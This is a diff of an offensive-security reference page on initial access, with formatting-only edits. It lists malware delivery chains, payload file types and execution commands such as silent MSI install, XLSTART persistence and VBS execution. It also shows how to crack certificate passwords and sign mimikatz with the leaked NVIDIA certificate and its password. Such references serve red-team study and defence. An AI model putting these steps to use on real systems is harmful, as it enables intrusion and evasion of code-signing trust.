@@ -12,7 +12,6 @@
     * [Embedded Files](#embedded-files)
 * [Code Signing](#code-signing)
 
-
 ## Complex Chains
 
 > DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))
@@ -31,28 +30,28 @@
     * Typically open PDF files
 
 Examples:
-* HTML SMUGGLING(PASSWORD PROTECTED ZIP + ISO(LNK + IcedID  + PNG)) used by [TA551/Storm-0303](https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/)
 
+* HTML SMUGGLING(PASSWORD PROTECTED ZIP + ISO(LNK + IcedID  + PNG)) used by [TA551/Storm-0303](https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/)
 
 ## Container
 
 * **ISO/IMG** - can contain hidden files, gets **automounted** giving easy access to contained files (`powershell –c .\malware.exe`)
 * **ZIP** - can contain hidden files (locate ZIP + unpack it + change dir + run Malware)
 * **WIM** - Windows Image, builtin format used to deploy system features
+
     ```ps1
     # Mount/Unmount .WIM
     PS> Mount-WindowsImage -ImagePath myarchive.wim -Path "C:\output\path\to\extract" -Index 1
     PS> Dismount-WindowsImage -Path "C:\output\path\to\extract" -Discard
     ```
-* **7-zip, RAR, GZ** - should get a native support on Windows 11
 
+* **7-zip, RAR, GZ** - should get a native support on Windows 11
 
 ## Trigger
 
 * **LNK**
 * **CHM**
 * **ClickOnce**
-
 
 ## Payload
 
@@ -62,6 +61,7 @@ These files can be executed directly on the system without any third party.
 
 * **.exe** file, executable file can be run with a click
 * **.dll** file, execute with `rundll32 main.dll,DllMain`
+
     ```c
     #define WIN32_LEAN_AND_MEAN
     #include <windows.h>
@@ -88,7 +88,9 @@ These files can be executed directly on the system without any third party.
     return TRUE;
     }
     ```
+
 * **.cpl** file, same as a .dll file with Cplapplet export
+
     ```c
     #include "stdafx.h"
     #include <Windows.h>
@@ -124,35 +126,37 @@ These files can be executed directly on the system without any third party.
     }
     ```
 
-
 ### Code Execution Files
 
 * Word with Macro (.doc, .docm)
 * Excel library (.xll)
 * Excel macro-enabled add-in file (.xlam)
+
     ```ps1
     xcopy /Q/R/S/Y/H/G/I evil.ini %APPDATA%\Microsoft\Excel\XLSTART
     ```
+
 * WSF files (.wsf)
 * MSI installers (.msi)
+
     ```ps1
     powershell Unblock-File evil.msi; msiexec /q /i .\evil.msi 
     ```
+
 * MSIX/APPX app package (.msix, .appx)
 * ClickOnce (.application, .vsto, .appref-ms)
 * Powershell scripts (.ps1)
 * Windows Script Host scripts (.wsh, .vbs)
+
     ```ps1
     cscript.exe payload.vbs
     wscript payload.vbs
     wscript /e:VBScript payload.txt
     ```
 
-
 ### Embedded Files
 
 * ICS Calendar Invites with Embedded Files
-
 
 ## Code Signing
 
@@ -163,15 +167,18 @@ Some of them can be found on VirusTotal, with the query :  `content:{02 01 03 30
 
 In 2022, LAPSUS$ claimed responsibility for a cyberattack on NVIDIA, a major graphics card and AI technology manufacturer. As part of this attack, LAPSUS$ allegedly stole proprietary data from NVIDIA and threatened to leak it. The leak contained
 
-
 * Certificates can be password protected. Use [pfx2john.py](https://gist.github.com/tijme/86edd06c636ad06c306111fcec4125ba)
+
     ```ps1
     john --wordlist=/opt/wordlists/rockyou.txt --format=pfx pfx.hashes
     ```
+
 * Sign a binary with a certificate.
+
     ```ps1
     osslsigncode sign -pkcs12 certs/nvidia-2014.pfx -in mimikatz.exe -out generated/signed-mimikatz.exe -pass nv1d1aRules
     ```
+
 * The following files can be signed with a certificate
     * executables: .exe, .dll, .ocx, .xll, .wll
     * scripts: .vbs, .js, .ps1
@@ -179,7 +186,6 @@ In 2022, LAPSUS$ claimed responsibility for a cyberattack on NVIDIA, a major gra
     * drivers: .sys
     * cabinets: .cab
     * ClickOnce: .application, .manifest, .vsto
-
 
 ## References
 
